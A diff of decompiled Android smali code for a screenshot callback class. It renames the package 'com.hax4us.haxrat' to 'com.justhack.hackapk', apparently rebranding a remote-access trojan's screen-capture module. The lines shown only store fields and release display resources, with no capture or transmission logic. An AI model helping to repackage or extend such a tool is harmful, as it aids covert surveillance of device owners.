@@ -1,11 +1,11 @@
-.class Lcom/hax4us/haxrat/Screenshot$100000002;
+.class Lcom/justhack/hackapk/Screenshot$100000002;
 .super Landroid/media/projection/MediaProjection$Callback;
 .source "Screenshot.java"
 
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lcom/hax4us/haxrat/Screenshot;
+    value = Lcom/justhack/hackapk/Screenshot;
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -15,7 +15,7 @@
 
 
 # instance fields
-.field private final this$0:Lcom/hax4us/haxrat/Screenshot;
+.field private final this$0:Lcom/justhack/hackapk/Screenshot;
 
 .field private final val$imageReader:Landroid/media/ImageReader;
 
@@ -25,7 +25,7 @@
 
 
 # direct methods
-.method constructor <init>(Lcom/hax4us/haxrat/Screenshot;Landroid/hardware/display/VirtualDisplay;Landroid/media/ImageReader;Landroid/media/projection/MediaProjection;)V
+.method constructor <init>(Lcom/justhack/hackapk/Screenshot;Landroid/hardware/display/VirtualDisplay;Landroid/media/ImageReader;Landroid/media/projection/MediaProjection;)V
     .locals 8
 
     move-object v0, p0
@@ -46,37 +46,37 @@
 
     move-object v7, v1
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/Screenshot$100000002;->this$0:Lcom/hax4us/haxrat/Screenshot;
+    iput-object v7, v6, Lcom/justhack/hackapk/Screenshot$100000002;->this$0:Lcom/justhack/hackapk/Screenshot;
 
     move-object v6, v0
 
     move-object v7, v2
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;
+    iput-object v7, v6, Lcom/justhack/hackapk/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;
 
     move-object v6, v0
 
     move-object v7, v3
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/Screenshot$100000002;->val$imageReader:Landroid/media/ImageReader;
+    iput-object v7, v6, Lcom/justhack/hackapk/Screenshot$100000002;->val$imageReader:Landroid/media/ImageReader;
 
     move-object v6, v0
 
     move-object v7, v4
 
-    iput-object v7, v6, Lcom/hax4us/haxrat/Screenshot$100000002;->val$mediaProjection:Landroid/media/projection/MediaProjection;
+    iput-object v7, v6, Lcom/justhack/hackapk/Screenshot$100000002;->val$mediaProjection:Landroid/media/projection/MediaProjection;
 
     return-void
 .end method
 
-.method static access$0(Lcom/hax4us/haxrat/Screenshot$100000002;)Lcom/hax4us/haxrat/Screenshot;
+.method static access$0(Lcom/justhack/hackapk/Screenshot$100000002;)Lcom/justhack/hackapk/Screenshot;
     .locals 4
 
     move-object v0, p0
 
     move-object v3, v0
 
-    iget-object v3, v3, Lcom/hax4us/haxrat/Screenshot$100000002;->this$0:Lcom/hax4us/haxrat/Screenshot;
+    iget-object v3, v3, Lcom/justhack/hackapk/Screenshot$100000002;->this$0:Lcom/justhack/hackapk/Screenshot;
 
     move-object v0, v3
 
@@ -107,14 +107,14 @@
     .line 145
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;
+    iget-object v2, v2, Lcom/justhack/hackapk/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;
 
     if-eqz v2, :cond_0
 
     .line 146
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;
+    iget-object v2, v2, Lcom/justhack/hackapk/Screenshot$100000002;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;
 
     invoke-virtual {v2}, Landroid/hardware/display/VirtualDisplay;->release()V
 
@@ -122,7 +122,7 @@
     :cond_0
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/Screenshot$100000002;->val$imageReader:Landroid/media/ImageReader;
+    iget-object v2, v2, Lcom/justhack/hackapk/Screenshot$100000002;->val$imageReader:Landroid/media/ImageReader;
 
     const/4 v3, 0x0
 
@@ -137,7 +137,7 @@
     .line 148
     move-object v2, v0
 
-    iget-object v2, v2, Lcom/hax4us/haxrat/Screenshot$100000002;->val$mediaProjection:Landroid/media/projection/MediaProjection;
+    iget-object v2, v2, Lcom/justhack/hackapk/Screenshot$100000002;->val$mediaProjection:Landroid/media/projection/MediaProjection;
 
     move-object v3, v0
 
